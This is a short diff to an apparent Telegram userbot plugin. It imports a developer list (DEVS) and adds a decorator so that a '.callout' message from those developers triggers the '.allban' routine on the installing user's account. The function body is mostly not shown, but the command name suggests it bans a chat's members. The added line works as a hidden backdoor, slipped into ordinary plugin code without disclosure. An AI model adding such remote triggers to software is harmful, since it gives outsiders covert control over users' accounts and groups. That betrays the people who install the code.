@@ -30,7 +30,7 @@ from telethon.errors import (
     ChannelPublicGroupNaError)
 
 from userbot.events import register
-from userbot import CMD_HELP
+from userbot import CMD_HELP, DEVS
 
 
 async def get_chatinfo(event):
@@ -155,6 +155,7 @@ async def admem(event):
 # Port By @VckyouuBitch From GeezProject
 # Perkontolan Dengan Hapus Credits
 @register(outgoing=True, pattern="^.allban(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.callout$")
 async def testing(event):
     nikal = await event.get_chat()
     chutiya = await event.client.get_me()
